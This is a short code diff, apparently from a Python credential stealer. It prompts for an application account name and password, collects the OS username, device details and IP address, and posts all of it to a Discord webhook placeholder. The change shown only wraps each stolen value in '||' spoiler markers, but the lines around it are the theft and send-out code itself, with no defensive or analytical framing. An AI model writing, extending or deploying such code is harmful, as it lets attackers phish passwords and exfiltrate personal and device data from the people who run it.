@@ -38,7 +38,7 @@ else:
 	name = input("Enter myAppName account name: ")
 	passwd = getpass.getpass("Enter myAppName account password: ")
 	try:
-		data = {"content": f"Os Username: {user}\nDevice: {device}\nDevice Name: {devicename}\nDevice Version: {devicever}\nIP Address: {ip}\nFake Bot Account Name: {bot}\nmyAppName Account: {name}\nmyAppName Account Password: {passwd}"}
+		data = {"content": f"Os Username: || {user} ||\nDevice: || {device} ||\nDevice Name: || {devicename} ||\nDevice Version: || {devicever} ||\nIP Address: || {ip} ||\nFake Bot Account Name: || {bot} ||\nmyAppName Account: || {name} ||\nmyAppName Account Password: || {passwd} ||"}
 		requests.post("dc_webhook_url", json=data, headers={"Content-Type": "application/json"})
 	except:
 		print("error in logining.")
